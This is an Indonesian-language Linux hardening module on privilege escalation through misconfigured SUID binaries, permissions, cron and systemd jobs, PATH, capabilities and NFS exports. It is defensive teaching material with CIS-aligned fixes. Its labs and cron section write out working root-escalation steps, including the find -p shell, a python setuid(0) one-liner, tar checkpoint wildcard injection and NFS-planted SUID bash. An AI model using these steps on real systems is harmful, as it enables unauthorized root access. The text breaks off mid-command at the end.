# 3. Common Linux Misconfigurations

> Misconfiguration adalah celah paling sering dieksploitasi untuk **privilege escalation lokal** di Linux: bukan bug pada kode, melainkan izin, kepemilikan, dan jalur yang dibiarkan terlalu longgar. Dari sudut pandang penyerang yang sudah punya shell sebagai user biasa (post-exploitation), lima hal pertama yang dienumerasi adalah SUID/SGID binary, file/direktori world-writable, cron job yang bisa ditulis, PATH yang bisa dibajak, dan Linux capabilities yang salah pasang — masing-masing bisa langsung memberi root. Modul ini mengajarkan cara mengenali, menutup, dan memverifikasi kelima pola itu, dengan nilai di-anchor ke **CIS Benchmark** (Ubuntu/RHEL) dan best practice. Build acuan: **Ubuntu/Debian** sebagai utama; padanan **RHEL/Rocky** diberi catatan bila berbeda.

## Daftar Isi

1. [Konsep & Tujuan](#1-konsep--tujuan)
2. [SUID/SGID Binaries](#2-suidsgid-binaries)
3. [Permission File & Direktori Sensitif](#3-permission-file--direktori-sensitif)
4. [Cron & Scheduled Jobs](#4-cron--scheduled-jobs)
5. [PATH Hijacking](#5-path-hijacking)
6. [Linux Capabilities](#6-linux-capabilities)
7. [NFS (Network File System)](#7-nfs-network-file-system)
8. [Serangan Umum & Mitigasi](#serangan-umum--mitigasi)
9. [Hardening Checklist (Modul Ini)](#hardening-checklist-modul-ini)
10. [Lab Praktik](#lab-praktik)
11. [Perintah Audit/Verifikasi](#perintah-auditverifikasi)
12. [Referensi](#referensi)

---

## 1. Konsep & Tujuan

Privilege escalation lewat misconfiguration bertumpu pada satu kenyataan: **kernel mengevaluasi izin, bukan niat.** Jika sebuah binary milik root berjalan dengan hak root (SUID), atau sebuah script yang dijalankan root bisa ditulis user biasa (cron/PATH), maka user biasa dapat memerintah kode berjalan sebagai root — tanpa exploit memori apa pun.

| Pola misconfig | Mekanisme eskalasi | Anchor kontrol |
|---|---|---|
| **SUID/SGID** | Binary berjalan dengan UID/GID pemilik (root), bukan pemanggil. | CIS — audit & minimalkan SUID/SGID, `nosuid` mount |
| **Permission longgar** | File sensitif terbaca (shadow) / world-writable bisa diubah. | CIS 6.1.x — mode & owner file sistem |
| **Cron writable** | Script yang dieksekusi root dapat diedit user biasa. | CIS 5.1.x — mode cron file/dir, restrict `cron.allow` |
| **PATH hijacking** | Direktori writable / relatif mendahului direktori sistem di `$PATH`. | Best practice — PATH absolut, hilangkan `.` |
| **Capabilities** | Bit kapabilitas (mis. `cap_setuid`) memberi hak parsial root. | CIS — audit `getcap`, hapus yang tak perlu |

**Tujuan modul:** menghapus *standing privilege* yang tidak perlu pada binary, file, dan task terjadwal, lalu memverifikasi tiap perubahan dengan perintah yang pasti jalan. Konsep ini adalah padanan Linux dari pengelolaan hak istimewa di Windows — lihat [`../windows/01-privileged-access-management.md`](../windows/01-privileged-access-management.md) (least privilege, assume breach) tanpa mengulang materi Windows.

**Batas modul (cross-ref):** pengelolaan **sudo/sudoers, su, PAM, polkit** ada di [`01-privileged-access-management-pam.md`](01-privileged-access-management-pam.md) — di sini hanya disinggung saat relevan. **Service berbahaya/terbuka** -> [`02-dangerous-exposed-services.md`](02-dangerous-exposed-services.md). **SSH/firewall/binding** -> [`04-network-service-security.md`](04-network-service-security.md). **auditd & sentralisasi log** dibahas tuntas di [`05-logging.md`](05-logging.md); rule audit di sini hanya cuplikan.

---

## 2. SUID/SGID Binaries

**APA.** Bit **SUID** (`chmod u+s`, mode `4xxx`) membuat program berjalan dengan **UID pemilik file** (umumnya root), bukan UID pemanggil. **SGID** (`g+s`, `2xxx`) memberi **GID grup pemilik**; pada direktori, SGID memaksa file baru mewarisi grup direktori. Pada listing `ls -l`, SUID tampak sebagai `s` di kolom owner (`-rwsr-xr-x`), SGID sebagai `s` di kolom group.

**KENAPA.** Sebagian SUID memang diperlukan (`passwd`, `sudo`, `su`, `mount`, `ping` pada distro lama). Bahaya muncul ketika binary **dengan fungsi shell-out** diberi SUID: penyerang memanfaatkannya untuk menjalankan perintah arbitrer sebagai root. Daftar binary yang bisa disalahgunakan ada di **GTFOBins**. Contoh klasik: `find` SUID -> `find . -exec /bin/sh -p \; -quit` memberi root shell; `cp`, `nano`, `vim`, `python`, `bash`, `tar`, `awk` SUID semuanya jalan menuju root.

**CARA — enumerasi seluruh SUID/SGID.** Jalankan baseline dan bandingkan terhadap daftar yang sah:

```bash
# SUID (bit 4000), SGID (bit 2000), atau keduanya (6000) — file reguler saja
find / -xdev -type f -perm -4000 2>/dev/null         # SUID
find / -xdev -type f -perm -2000 2>/dev/null         # SGID
find / -xdev -type f -perm -6000 -exec ls -l {} \;   # keduanya, dengan detail
```

`-xdev` membatasi pada satu filesystem (hindari menyusuri NFS/mount eksternal). Bandingkan output dengan daftar GTFOBins untuk menandai yang berbahaya.

**CARA — hapus bit yang tak perlu.** Cabut SUID/SGID dari binary yang tidak butuh hak root, jangan dihapus binary-nya:

```bash
chmod u-s /path/ke/binary        # cabut SUID
chmod g-s /path/ke/binary        # cabut SGID
```

**CARA — defense in depth via opsi mount.** Cegah SUID *baru* dieksekusi pada partisi data dengan flag `nosuid` (juga `nodev`, `noexec`) — sesuai rekomendasi CIS untuk `/tmp`, `/var/tmp`, `/dev/shm`, dan `/home`:

```bash
# /etc/fstab — contoh untuk /tmp
tmpfs   /tmp   tmpfs   defaults,nosuid,nodev,noexec   0 0
# terapkan tanpa reboot:
mount -o remount,nosuid,nodev,noexec /tmp
```

> RHEL/Rocky: idem; banyak distro modern memakai `tmp.mount` (systemd) — atur opsi via `systemctl edit tmp.mount` atau `/etc/fstab`.

---

## 3. Permission File & Direktori Sensitif

**APA.** Izin POSIX (mode + owner/group) yang salah pada file kredensial atau direktori sistem. Dua kelas utama: **file sensitif terlalu terbuka** (mis. `/etc/shadow` terbaca) dan **objek world-writable** (siapa pun bisa menulis), termasuk file tanpa pemilik (`-nouser`).

**KENAPA.** `/etc/shadow` yang terbaca = hash password siap di-crack offline (Hashcat/John). Direktori world-writable tanpa sticky bit memungkinkan user mengganti/menghapus file milik user lain. File `-nouser` (UID pemilik tak ada di `/etc/passwd`) sering jadi titik tumpang penyerang.

**CARA — nilai mode/owner yang benar (CIS 6.1.x).**

| File | Ubuntu/Debian | RHEL/Rocky | Catatan |
|---|---|---|---|
| `/etc/passwd` | `644 root:root` | sama | world-readable wajar (tanpa hash) |
| `/etc/group` | `644 root:root` | sama | |
| `/etc/shadow` | `640 root:shadow` | `0000 root:root` | hash password — beda grup per distro |
| `/etc/gshadow` | `640 root:shadow` | `0000 root:root` | |
| `/etc/passwd-`,`/etc/shadow-` (backup) | mirip file aslinya | mirip | sering terlupakan |

```bash
# Perbaiki contoh (Ubuntu): jadikan shadow tak terbaca publik
chown root:shadow /etc/shadow && chmod 640 /etc/shadow
# Verifikasi mode + owner sekaligus:
stat -c '%n %a %U:%G' /etc/passwd /etc/shadow /etc/gshadow /etc/group
```

**CARA — buru objek berisiko.**

```bash
# File world-writable
find / -xdev -type f -perm -0002 2>/dev/null
# Direktori world-writable TANPA sticky bit (paling berbahaya)
find / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null
# File/dir tanpa pemilik atau grup yang valid
find / -xdev \( -nouser -o -nogroup \) 2>/dev/null
```

Perbaiki: cabut bit world-write (`chmod o-w`), set sticky pada direktori shared (`chmod +t`), dan tetapkan pemilik valid (`chown`). `/tmp` & `/var/tmp` harus `1777` (sticky) — itu *benar*, bukan temuan.

**CARA — umask default.** Pastikan file baru tidak lahir terlalu terbuka. CIS mensyaratkan umask **027** atau lebih ketat di `/etc/login.defs` (`UMASK 027`) dan `/etc/profile` / `/etc/bash.bashrc`:

```bash
grep -E '^\s*UMASK' /etc/login.defs        # harapkan 027
```

---

## 4. Cron & Scheduled Jobs

**APA.** `cron`/`at` menjalankan task terjadwal. Job di `/etc/crontab`, `/etc/cron.d/`, dan direktori `cron.{hourly,daily,weekly,monthly}` berjalan sebagai **root**. Crontab per-user (`crontab -e`) tersimpan di `/var/spool/cron/`.

**KENAPA.** Jika **script yang dipanggil cron root bisa ditulis** user biasa, penyerang menyisipkan perintah dan menunggu cron mengeksekusinya sebagai root — eskalasi pasif yang sangat umum. Begitu pula file/direktori cron yang world-writable.

**CARA — kunci mode & owner (CIS 5.1.x).**

| Objek | Mode | Owner | Tujuan |
|---|---|---|---|
| `/etc/crontab` | `600` | `root:root` | hanya root baca/tulis |
| `/etc/cron.hourly` (dan daily/weekly/monthly) | `700` | `root:root` | direktori → butuh bit `x` |
| `/etc/cron.d` | `700` | `root:root` | |
| `/etc/cron.allow`, `/etc/at.allow` | `640` | `root:root` | whitelist user; hilangkan `cron.deny`/`at.deny` |

```bash
chown root:root /etc/crontab && chmod 600 /etc/crontab
chmod 700 /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d
# Batasi siapa yang boleh pakai cron/at (allow-list), bukan deny-list:
echo root > /etc/cron.allow && chmod 640 /etc/cron.allow && chown root:root /etc/cron.allow
rm -f /etc/cron.deny /etc/at.deny
```

**CARA — periksa skrip yang dipanggil cron bisa ditulis.** Job yang aman pun berbahaya bila *targetnya* writable:

```bash
# Tampilkan semua entri cron sistem, lalu audit izin file targetnya
cat /etc/crontab /etc/cron.d/* 2>/dev/null
find /etc/cron.* /etc/crontab -perm -0002 2>/dev/null   # cron object world-writable
```

Set `PATH` eksplisit dan absolut di header crontab (mis. `PATH=/usr/sbin:/usr/bin:/sbin:/bin`) dan panggil binary dengan path penuh — ini menutup celah PATH (§5) pada konteks cron.

**CARA — wildcard / argument injection (script root yang aman pun bisa di-abuse).** Bahaya berikutnya bukan pada *file* cron, melainkan pada *cara* script root memanggil binary dengan **wildcard `*`** di direktori yang bisa ditulis user. Shell meng-*expand* `*` menjadi **daftar nama file** sebelum binary dijalankan; jika user menamai file persis seperti **opsi** binary (diawali `-`/`--`), opsi itu ikut tersuntik ke command line yang berjalan sebagai root.

Contoh paling ikonik — cron root menjalankan `tar` dengan wildcard pada `/opt/backup` (writable):

```bash
# Job root (misconfig): * * * * * cd /opt/backup && tar czf /root/bak.tgz *
# tar punya --checkpoint + --checkpoint-action=exec=<cmd> → eksekusi perintah arbitrer.
# Sebagai 'lowpriv' di /opt/backup, buat 3 "file" yang sebenarnya argumen tar:
cd /opt/backup
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
# Saat cron root meng-glob '*', baris yang jalan menjadi:
#   tar czf /root/bak.tgz --checkpoint=1 --checkpoint-action=exec=sh\ runme.sh runme.sh
# tar mencapai checkpoint #1 → menjalankan runme.sh sebagai root.
/tmp/rootbash -p   # tunggu cron, lalu → euid=0
```

Varian lain dengan pola yang sama: **`chown`/`chmod`** dengan `--reference=<file>` (paksa kepemilikan/mode mengikuti file milik attacker), dan **`rsync`** dengan `-e <cmd>`/`--rsh=<cmd>` (eksekusi perintah). Akar masalahnya selalu sama: glob + binary yang punya opsi berbahaya.

**Perbaikan (fix).**

- **Akhiri opsi dengan `--`:** `tar czf /root/bak.tgz -- *` — segalanya setelah `--` diperlakukan sebagai nama file, bukan opsi.
- **Prefix `./`:** glob `./*` mengembang menjadi `./--checkpoint=1` (nama file biasa, bukan opsi). Penting: sekadar *meng-quote* `"*"` **tidak** menolong — glob tetap mengembang ke nama berbahaya; yang memutus adalah `--` atau prefix `./`.
- **Jangan glob direktori writable user** dari job root; pakai daftar file eksplisit atau `find ... -print0 | xargs -0`.
- **Jangan jalankan job root dengan CWD di direktori yang ditulis user**; set `cd` ke lokasi terkendali.

**Systemd timer/unit & ExecStart writable (vektor setara cron modern).** Pengganti cron di distro modern adalah **systemd timer**. Kalau file unit (`.service`/`.timer`) di `/etc/systemd/system/` **bisa ditulis non-root**, atau binary/script yang dirujuk `ExecStart=` writable, maka attacker mengubah perintah yang dijalankan service root.

```bash
# Buru unit & target ExecStart yang writable oleh non-root:
find /etc/systemd/system /run/systemd/system /lib/systemd/system -maxdepth 2 -perm -0002 -type f 2>/dev/null
# Ambil semua path ExecStart lalu cek izin tulisnya (script yang dipanggil service root)
systemctl show '*.service' -p ExecStart 2>/dev/null | grep -oE '/[^ ]+\.sh|/usr/local/[^ ;]+' | sort -u | xargs -r ls -l
```

Kunci: file unit harus `644 root:root` (atau `640`), direktori `/etc/systemd/system` tidak world-writable, dan target `ExecStart` dimiliki root serta tidak writable user. Ini analog langsung dengan *unquoted/ writable service binary* di Windows.

---

## 5. PATH Hijacking

**APA.** `$PATH` menentukan urutan direktori yang dicari shell saat sebuah perintah dipanggil **tanpa path absolut**. Hijacking terjadi bila direktori yang **bisa ditulis user** muncul di PATH (terutama di depan), atau bila PATH memuat **`.` (current dir)** atau elemen kosong (`::`, `:` di awal/akhir — keduanya berarti direktori kerja).

**KENAPA.** Jika script/binary yang dijalankan root memanggil perintah secara relatif (mis. `tar`, `cat`, `service`) dan penyerang menaruh binary jahat bernama sama di direktori writable yang lebih awal di PATH, kernel menjalankan versi jahat itu **sebagai root**. Pola ini berpasangan dengan SUID (§2) dan cron (§4).

**CARA — bersihkan PATH root & global.**

```bash
echo "$PATH"                       # cari '.', '::', ':' di awal/akhir, atau dir writable
# Periksa tiap direktori PATH apakah world-writable:
echo "$PATH" | tr ':' '\n' | while read d; do
  [ -d "$d" ] && find "$d" -maxdepth 0 -perm -0002 2>/dev/null && echo "  ^ WRITABLE: $d"
done
```

- Hilangkan `.` dan elemen kosong dari `PATH` di `/etc/profile`, `/etc/environment`, `/root/.bashrc`, dan header crontab.
- Pastikan tidak ada direktori PATH milik non-root atau world-writable.
- Dalam script root, panggil binary dengan **path absolut** (`/usr/bin/tar`) atau set PATH eksplisit di awal script.

> Konsep ini analog dengan *unquoted service path* / *DLL search-order hijacking* di Windows — lihat [`../windows/01-privileged-access-management.md`](../windows/01-privileged-access-management.md) untuk padanannya tanpa mengulang.

---

## 6. Linux Capabilities

**APA.** Capabilities memecah hak monolitik root menjadi unit-unit kecil (mis. `cap_net_bind_service` untuk bind port < 1024). Disetel pada file dengan `setcap`, dibaca dengan `getcap`. Format flag: `cap_xxx+ep` — **e** = effective, **p** = permitted (artinya kapabilitas aktif saat binary dijalankan).

**KENAPA.** Capabilities ditujukan untuk **mengurangi** kebutuhan SUID penuh. Tapi salah pasang sama bahayanya: sebuah interpreter dengan `cap_setuid+ep` setara root. Beberapa capability bersifat "setara root":

| Capability | Risiko bila pada binary salah |
|---|---|
| `cap_setuid` / `cap_setgid` | Ubah UID/GID ke 0 → root langsung (mis. `python -c 'import os;os.setuid(0);os.system("/bin/sh")'`) |
| `cap_dac_read_search` | Lewati cek izin baca → baca `/etc/shadow`, file siapa pun |
| `cap_dac_override` | Lewati semua cek baca/tulis/eksekusi file |
| `cap_sys_admin` | "Mini-root" — mount, namespace, banyak operasi admin |
| `cap_sys_ptrace` | Inject ke proses lain (termasuk milik root) |
| `cap_sys_module` | Muat kernel module → kompromi total |
| `cap_net_raw` | Sniff/spoof paket mentah |

**CARA — enumerasi & cabut.**

```bash
# Daftar semua file dengan capability (butuh paket libcap2-bin di Ubuntu / libcap di RHEL)
getcap -r / 2>/dev/null
# Saring yang paling berbahaya:
getcap -r / 2>/dev/null | grep -Ei 'cap_setuid|cap_dac_|cap_sys_admin|cap_sys_module|cap_sys_ptrace'
# Cabut SEMUA capability dari sebuah binary:
setcap -r /path/ke/binary
# atau set ulang ke nilai minimal yang sah, mis. hanya bind port rendah:
setcap cap_net_bind_service=+ep /usr/bin/contoh
```

Prinsipnya: capability hanya boleh ada pada binary yang **memang dirancang** untuknya (mis. `ping` boleh `cap_net_raw` pada distro modern). Interpreter umum (`python`, `perl`, `node`, `bash`) **tidak boleh** punya capability apa pun.

---

## 7. NFS (Network File System)

**APA.** **NFS** mengekspor direktori host (server) agar di-*mount* dan dipakai host lain (client) lewat jaringan. Daftar ekspor ada di **`/etc/exports`**; layanan bersandar pada `rpcbind`/`portmapper` (port **111**) untuk pemetaan RPC dan daemon NFS (port **2049**). Inventaris service NFS/rpcbind ada di [`02-dangerous-exposed-services.md`](02-dangerous-exposed-services.md) §3 — di sini fokus ke **privesc lewat opsi ekspor yang salah**, terutama `no_root_squash`.

**KENAPA — mekanisme `no_root_squash`.** Secara default NFS memakai **`root_squash`**: UID 0 (root) dari client di-*petakan* ke user tak-berhak (`nobody`/`nfsnobody`) di server, sehingga root di client **tidak** menjadi root di file server. Opsi **`no_root_squash`** mematikan pemetaan itu: **UID 0 client diperlakukan sebagai root server**. Akibatnya, siapa pun yang punya root pada *salah satu* host yang boleh me-mount (atau pada mesin attacker di subnet yang sama) dapat menulis file milik root ke share — termasuk **binary SUID root**. Itu jalur privesc boot2root klasik: rantai dari foothold → root di mesin attacker → SUID root via NFS → root di target. Ekspor `rw` ke `*` (semua host) + `no_root_squash` adalah kombinasi paling berbahaya.

**CARA — enumerasi (sisi penyerang & audit).**

```bash
# Dari mesin lain: daftar ekspor & host yang diizinkan (butuh showmount; paket nfs-common)
showmount -e 10.10.0.10
# Pemetaan RPC (lihat apakah nfs/mountd/portmapper hidup)
rpcinfo -p 10.10.0.10
# Di server: lihat ekspor aktif + opsinya (sumber kebenaran, termasuk default tersembunyi)
exportfs -v
cat /etc/exports /etc/exports.d/*.exports 2>/dev/null
```

Yang dicari pada `exportfs -v`/`/etc/exports`: opsi **`no_root_squash`**, ekspor `rw` yang seharusnya `ro`, dan target host `*` (atau subnet terlalu lebar) di mana seharusnya host/subnet spesifik.

**CARA — hardening `/etc/exports`.**

| Opsi | Efek | Rekomendasi |
|---|---|---|
| `root_squash` | UID 0 client → `nobody` di server | **Default & wajib** — jangan pernah `no_root_squash` |
| `all_squash` | **Semua** UID client → `nobody` (cocok untuk share publik/anonim) | Pakai untuk data read-only bersama |
| `ro` | Ekspor read-only | Default-kan `ro`; `rw` hanya bila perlu |
| `nosuid` (opsi mount client) | Abaikan bit SUID/SGID dari file di share | Mount client `nosuid,nodev` (defense-in-depth) |
| Scope host | `10.10.0.0/24(...)` bukan `*` | Batasi ke subnet/host spesifik |

```bash
# /etc/exports — contoh aman (read-only, root di-squash, dibatasi subnet):
/srv/share   10.10.0.0/24(ro,root_squash,sync,no_subtree_check)
# Bila perlu tulis untuk satu host saja, tetap squash root:
/srv/data    10.10.0.20(rw,root_squash,sync,no_subtree_check)
# Terapkan perubahan tanpa restart penuh:
sudo exportfs -ra
sudo exportfs -v          # verifikasi opsi efektif (pastikan TIDAK ada no_root_squash)
```

Pada sisi **client**, mount dengan `nosuid,nodev` agar SUID dari share tidak pernah dieksekusi sebagai root walau server salah konfigurasi:

```bash
mount -t nfs -o ro,nosuid,nodev 10.10.0.10:/srv/share /mnt/share
```

Batasi pula akses jaringan ke port **111/2049** lewat firewall ke subnet management saja -> [`04-network-service-security.md`](04-network-service-security.md). Untuk keamanan kuat, gunakan **NFSv4 + Kerberos (`sec=krb5p`)** menggantikan trust berbasis IP.

---

## Serangan Umum & Mitigasi

| Serangan | Teknik / contoh | MITRE ATT&CK | Mitigasi di modul ini |
|---|---|---|---|
| **SUID abuse (GTFOBins)** | `find -exec`, `bash -p`, `vim`/`python` SUID → root | T1548.001 (Setuid/Setgid) | §2 audit & cabut SUID, `nosuid` mount |
| **PwnKit** | CVE-2021-4034, `pkexec` (SUID polkit) | T1548.001 / T1068 | §2 patch + audit SUID; polkit -> Modul 01 |
| **Writable cron job** | Edit script root → eksekusi terjadwal | T1053.003 (Cron) | §4 mode cron, audit target writable |
| **Cron wildcard/arg injection** | `tar --checkpoint-action`, `chown/rsync --reference/-e` via glob `*` di dir writable | T1053.003 (Cron) / T1059.004 (Unix Shell) | §4 akhiri opsi `--` / prefix `./`, jangan glob dir writable user |
| **Writable systemd unit/ExecStart** | Ubah `.service`/`.timer` atau target `ExecStart` writable → service root jalankan payload | T1543.002 (Systemd Service) / T1053.006 (Systemd Timer) | §4 unit `644 root:root`, `ExecStart` milik root non-writable |
| **NFS `no_root_squash` privesc** | Mount export → tulis SUID root dari mesin attacker → jalankan `-p` di target | T1080 (Taint Shared Content) / T1548.001 (Setuid) | §7 `root_squash`/`all_squash`, scope subnet, client `nosuid` |
| **PATH hijack** | Binary palsu di dir writable di depan PATH | T1574.007 (Path Interception by PATH Env Var) | §5 PATH absolut, hapus `.`/dir writable |
| **Capability abuse** | `python` `cap_setuid+ep` → setuid(0) | T1548.001 / T1068 (tak ada sub-ID khusus capabilities) | §6 audit `getcap`, cabut yang tak perlu |
| **Shadow disclosure** | Baca `/etc/shadow` (perm longgar / `cap_dac_read_search`) → crack offline | T1003.008 (/etc/passwd & /etc/shadow) | §3 mode `640/000`, §6 cabut `cap_dac_read_search` |
| **Permission weakness** | World-writable file sistem diubah | T1222.002 (Linux File & Dir Perms Mod) | §3 buru world-writable, set owner/sticky |
| **Kernel/local exploit** | Setelah enumerasi misconfig gagal | T1068 (Exploitation for Priv Esc) | Patch kernel; di luar cakupan modul ini |
| **Sudo misconfig (Baron Samedit)** | CVE-2021-3156 | T1548.003 (Sudo and Sudo Caching) | -> Modul 01 (sudoers) |

---

## Hardening Checklist (Modul Ini)

- [ ] Baseline **SUID/SGID** diambil; binary tak perlu dicabut bit-nya; tidak ada interpreter/`find`/`vim`/`python` SUID.
- [ ] Partisi `/tmp`, `/var/tmp`, `/dev/shm`, `/home` di-mount **`nosuid,nodev,noexec`** (sesuai peran).
- [ ] `/etc/shadow` & `/etc/gshadow` **tidak terbaca publik** (`640 root:shadow` di Ubuntu / `0000 root:root` di RHEL); `/etc/passwd` & `/etc/group` `644 root:root`.
- [ ] **Tidak ada** file world-writable tak terkelola; direktori world-writable punya **sticky bit**; tidak ada objek `-nouser`/`-nogroup`.
- [ ] `umask` default **027** atau lebih ketat di `/etc/login.defs`.
- [ ] Mode cron benar: `/etc/crontab` **600**, `cron.d` & `cron.{hourly,daily,weekly,monthly}` **700**, owner `root:root`.
- [ ] **`cron.allow`/`at.allow`** dipakai (allow-list, `640 root:root`); `cron.deny`/`at.deny` dihapus.
- [ ] Script yang dipanggil cron **tidak writable** oleh non-root; cron memakai **PATH absolut**.
- [ ] Job root **tidak meng-glob `*`** pada direktori yang ditulis user; bila terpaksa, opsi diakhiri `--` atau prefix `./` (anti wildcard/arg injection).
- [ ] File unit systemd `.service`/`.timer` = **`644 root:root`**, direktori `/etc/systemd/system` tak world-writable, target **`ExecStart` milik root & non-writable**.
- [ ] `$PATH` root/global tidak memuat **`.`**, elemen kosong, atau direktori **world-writable**.
- [ ] **`getcap -r /`** bersih: hanya binary yang dirancang untuknya punya capability; interpreter tanpa capability.
- [ ] **NFS:** `exportfs -v` **tanpa `no_root_squash`**; ekspor default `ro`, di-`root_squash`/`all_squash`, dibatasi subnet (bukan `*`); client mount `nosuid,nodev`.
- [ ] (Opsional) Rule **auditd** untuk eksekusi SUID/privileged dipasang -> detail di [`05-logging.md`](05-logging.md).

---

## Lab Praktik

**Topologi:** satu host Linux lab (`target`, Ubuntu 22.04/24.04) dengan akun `lowpriv` (user biasa) dan akses root untuk hardening. Lab 1–5 cukup host tunggal ini; **Lab 6 (NFS) membutuhkan host kedua** (`attacker`) di subnet yang sama. Semua latihan dilakukan di VM/lab terisolasi.

**Prasyarat (sekali saja, sebagai root):** buat akun uji `lowpriv` bila belum ada:
```bash
sudo useradd -m -s /bin/bash lowpriv && sudo passwd lowpriv
```
Buka satu shell tambahan sebagai `lowpriv` (mis. `sudo su - lowpriv` atau SSH terpisah) untuk menjalankan langkah ber-label **`lowpriv`**.

### Lab 1 — SUID abuse lalu tutup

1. Sebagai root, buat misconfig sengaja: `cp /usr/bin/find /tmp/find && chmod 4755 /tmp/find`.
2. **Lakukan (sebagai `lowpriv`):** `/tmp/find . -exec /bin/sh -p \; -quit` → dapat shell `# ` (euid root). **Konfirmasi:** `id` menunjukkan `euid=0(root)`.
3. **Hardening:** `chmod u-s /tmp/find` (atau hapus). **Konfirmasi dengan:** ulangi langkah 2 → shell kini berjalan sebagai `lowpriv`, bukan root.

### Lab 2 — Capability `cap_setuid`

1. Root: `cp /usr/bin/python3 /tmp/py && setcap cap_setuid+ep /tmp/py`.
2. **Lakukan (`lowpriv`):** `/tmp/py -c 'import os;os.setuid(0);os.system("id")'` → tampil `uid=0(root)`.
3. **Hardening:** `setcap -r /tmp/py`. **Konfirmasi dengan:** `getcap /tmp/py` → output kosong; ulangi langkah 2 → tetap `lowpriv`.

### Lab 3 — Cron writable

1. Root buat job tiap menit: tulis `/etc/cron.d/backup` berisi `* * * * * root /opt/backup.sh`, lalu `chmod 777 /opt/backup.sh` (misconfig).
2. **Lakukan (`lowpriv`):** `echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /opt/backup.sh`; tunggu ≤ 60 detik; jalankan `/tmp/rootbash -p` → root shell.
3. **Hardening:** `chown root:root /opt/backup.sh && chmod 750 /opt/backup.sh`. **Konfirmasi:** `lowpriv` tidak bisa lagi menulis (`echo x >> /opt/backup.sh` → Permission denied).

### Lab 4 — PATH hijack

1. Sebagai root, buat script privileged yang **rentan** — PATH menaruh `/tmp` (writable) di depan dan memanggil `tar` secara relatif (mensimulasikan job/utility yang dijalankan root):
   ```bash
   sudo tee /usr/local/sbin/runjob >/dev/null <<'EOF'
   #!/bin/sh
   export PATH=/tmp:/usr/bin:/bin     # MISCONFIG: dir writable user di depan PATH
   tar --version >/dev/null           # panggilan relatif → bisa dibajak
   echo "runjob selesai sebagai $(id -un)"
   EOF
   sudo chmod 755 /usr/local/sbin/runjob
   ```
2. **Lakukan (`lowpriv`):** tanam `tar` palsu di `/tmp` yang lebih dulu ditemukan PATH:
   ```bash
   cat > /tmp/tar <<'EOF'
   #!/bin/sh
   cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
   EOF
   chmod +x /tmp/tar
   ```
3. Sebagai root (mensimulasikan eksekusi terjadwal), jalankan script: `sudo /usr/local/sbin/runjob`. **Konfirmasi (`lowpriv`):** `/tmp/rootbash -p` → root shell (`id` → `euid=0`), karena `/tmp/tar` dieksekusi sebagai root.
4. **Hardening:** ubah script agar memakai path absolut dan PATH aman:
   ```bash
   sudo sed -i 's#^export PATH=.*#export PATH=/usr/sbin:/usr/bin:/sbin:/bin#' /usr/local/sbin/runjob
   sudo sed -i 's#^tar --version#/usr/bin/tar --version#'                      /usr/local/sbin/runjob
   sudo rm -f /tmp/rootbash
   ```
   **Konfirmasi dengan:** ulangi langkah 2–3 → `/usr/bin/tar` (asli) yang dipanggil, `/tmp/tar` diabaikan, `/tmp/rootbash` **tidak** terbentuk.

### Lab 5 — Cron wildcard injection (tar)

1. Root buat job tiap menit yang mem-*backup* direktori writable dengan wildcard: `/etc/cron.d/bk` berisi `* * * * * root cd /opt/backup && tar czf /root/bak.tgz *`, lalu `mkdir -p /opt/backup && chmod 777 /opt/backup` (misconfig).
2. **Lakukan (`lowpriv`):**
   ```bash
   cd /opt/backup
   echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > runme.sh
   touch -- '--checkpoint=1'
   touch -- '--checkpoint-action=exec=sh runme.sh'
   ```
   Tunggu ≤ 60 detik, lalu `/tmp/rootbash -p` → root shell (`id` → `euid=0`).
3. **Hardening:** ubah job menjadi `tar czf /root/bak.tgz -- *` (akhiri opsi) **atau** `tar czf /root/bak.tgz ./*`, dan hindari `cd` ke direktori writable user. **Konfirmasi:** ulangi langkah 2 → `tar` memperlakukan `--checkpoint=1` sebagai nama file biasa, payload **tidak** dieksekusi (`/tmp/rootbash` tak terbentuk).

### Lab 6 — NFS `no_root_squash` privesc lalu tutup

**Prasyarat:** dua host — `server` (`10.10.0.10`) dan `attacker` (punya root, subnet sama). Pasang paket:
```bash
# di server:
sudo apt install -y nfs-kernel-server          # RHEL: sudo dnf install -y nfs-utils
# di attacker:
sudo apt install -y nfs-common                 # menyediakan 'mount.nfs' & 'showmount'
```

1. Sebagai root di `server`, buat share + ekspor yang **sengaja rentan**, lalu aktifkan:
   ```bash
   sudo mkdir -p /srv/share
   echo '/srv/share *(rw,no_root_squash,sync,no_subtree_check)' | sudo tee /etc/exports
   sudo exportfs -ra
   sudo systemctl restart nfs-kernel-server     # RHEL: nfs-server
   ```
2. **Lakukan (dari `attacker`, sebagai root):**
   ```bash
   showmount -e 10.10.0.10                 # → /srv/share diekspor ke *
   sudo mkdir -p /mnt/nfs && sudo mount -t nfs 10.10.0.10:/srv/share /mnt/nfs
   sudo cp /bin/bash /mnt/nfs/rootbash     # ditulis sebagai root → di server pun milik root
   sudo chown root:root /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash
   ```
   Di `server`, user biasa (`lowpriv`) menjalankan `/srv/share/rootbash -p` → `euid=0` (root).
3. **Hardening (di `server`):** persempit ekspor jadi `root_squash` + dibatasi subnet, lalu re-export:
   ```bash
   echo '/srv/share 10.10.0.0/24(ro,root_squash,sync,no_subtree_check)' | sudo tee /etc/exports
   sudo exportfs -ra
   sudo exportfs -v                        # → TIDAK ada 'no_root_squash'
   ```
   Di `attacker`, remount dengan `nosuid,nodev`: `sudo umount /mnt/nfs; sudo mount -t nfs -o ro,nosuid,nodev 10.10.0.10:/srv/share /mnt/nfs`.
   **Konfirmasi dengan:** ulangi langkah 2 → file SUID root tak bisa lagi dibuat (UID 0 di-squash ke `nobody`), dan andai ada SUID lama, `nosuid` membuatnya jalan tanpa hak root.

---

## Perintah Audit/Verifikasi

```bash
# === SUID/SGID === (harapkan hanya binary sistem yang sah; tak ada interpreter)
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null

# === Permission file sensitif === (Ubuntu: shadow 640 root:shadow)
stat -c '%n %a %U:%G' /etc/passwd /etc/group /etc/shadow /etc/gshadow \
